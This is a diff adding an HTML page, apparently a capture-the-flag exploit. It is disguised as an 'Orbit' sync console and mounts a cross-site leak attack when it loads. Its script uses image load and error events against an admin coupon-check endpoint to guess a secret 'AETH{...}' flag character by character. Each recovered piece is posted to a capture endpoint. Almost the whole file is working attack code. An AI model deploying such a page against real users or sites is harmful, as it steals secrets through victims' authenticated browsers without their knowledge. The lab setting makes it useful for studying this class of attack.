@@ -1,0 +1,89 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Orbit</title>
+  <style>
+    :root { color-scheme: dark; }
+    body {
+      margin: 0; min-height: 100vh; display: grid; place-items: center;
+      background: radial-gradient(circle at 50% 0, #1a2b5a 0, #05070e 55%);
+      color: #dce6ff; font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
+    }
+    .console { width: min(92vw, 620px); border: 1px solid #26324f; border-radius: 18px; background: #0a101d; padding: 26px; box-shadow: 0 30px 80px rgba(0,0,0,.5); }
+    h1 { font-size: 14px; letter-spacing: .18em; margin: 0 0 6px; }
+    p { color: #7386aa; font-size: 12px; line-height: 1.6; }
+    #out { margin-top: 18px; border-top: 1px solid #1c2740; padding-top: 16px; font-size: 13px; white-space: pre-wrap; word-break: break-all; color: #91f5bf; }
+    .bar { height: 3px; background: #15213a; margin-top: 16px; border-radius: 2px; overflow: hidden; }
+    .bar span { display: block; height: 100%; width: 0; background: linear-gradient(90deg,#7d8cff,#63ffb7); transition: width .2s; }
+  </style>
+</head>
+<body>
+  <div class="console">
+    <h1>AETHERION / ORBIT</h1>
+    <p>syncing public experience</p>
+    <div class="bar"><span id="bar"></span></div>
+    <div id="out">initializing…</div>
+  </div>
+  <script>
+    const APP = new URLSearchParams(location.search).get('target') || 'http://aetherion.local:8080';
+    const ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789{}_-';
+    const out = document.getElementById('out');
+    const bar = document.getElementById('bar');
+    let prefix = 'AETH{';
+    const started = Date.now();
+
+    function probe(candidate) {
+      return new Promise((resolve) => {
+        const img = new Image();
+        let settled = false;
+        const finish = (value) => {
+          if (settled) return;
+          settled = true;
+          img.onload = img.onerror = null;
+          clearTimeout(timer);
+          resolve(value);
+        };
+        const timer = setTimeout(() => finish(false), 700);
+        img.onload = () => finish(true);
+        img.onerror = () => finish(false);
+        img.src = `${APP}/api/admin/coupons/check?prefix=${encodeURIComponent(candidate)}&r=${Math.random().toString(36).slice(2)}`;
+      });
+    }
+
+    async function exfil(value, complete) {
+      try {
+        await fetch('/capture/xsleak', {
+          method: 'POST',
+          headers: { 'content-type': 'application/json' },
+          body: JSON.stringify({ value, complete }),
+        });
+      } catch (error) {}
+    }
+
+    (async () => {
+      while (!prefix.endsWith('}') && prefix.length < 96) {
+        let found = null;
+        for (const character of ALPHABET) {
+          const candidate = prefix + character;
+          out.textContent = `probing ${candidate}`;
+          if (await probe(candidate)) {
+            found = character;
+            prefix = candidate;
+            break;
+          }
+        }
+        bar.style.width = `${Math.min(96, prefix.length * 3)}%`;
+        out.textContent = prefix;
+        await exfil(prefix, prefix.endsWith('}'));
+        if (!found) break;
+      }
+      out.textContent = prefix.endsWith('}')
+        ? `${prefix}\n\ncapture complete in ${Math.round((Date.now() - started) / 1000)}s`
+        : `${prefix}\n\nno further transition`;
+      await exfil(prefix, prefix.endsWith('}'));
+    })();
+  </script>
+</body>
+</html>
